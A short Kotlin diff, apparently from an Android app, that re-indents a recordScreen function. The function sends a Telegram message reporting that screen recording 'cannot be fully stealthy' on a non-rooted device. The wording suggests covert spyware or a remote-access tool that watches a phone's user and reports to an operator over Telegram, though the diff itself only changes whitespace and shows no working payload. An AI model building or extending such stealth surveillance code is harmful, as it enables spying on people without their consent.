@@ -302,13 +302,18 @@ CoroutineScope(Dispatchers.IO).launch {
         }
     }
 
-    private fun recordScreen(durationSec: Int) {
 
-CoroutineScope(Dispatchers.IO).launch {
-    sendTelegramMessage        
-("Screen recording requires user interaction on non-rooted device. Cannot be fully stealthy.")
-}
+
+
+
+
+private fun recordScreen(durationSec: Int) {
+
+    CoroutineScope(Dispatchers.IO).launch {
+        sendTelegramMessage("Screen recording requires user interaction on non-rooted device. Cannot be fully stealthy.")
     }
+}
+
 
         
 
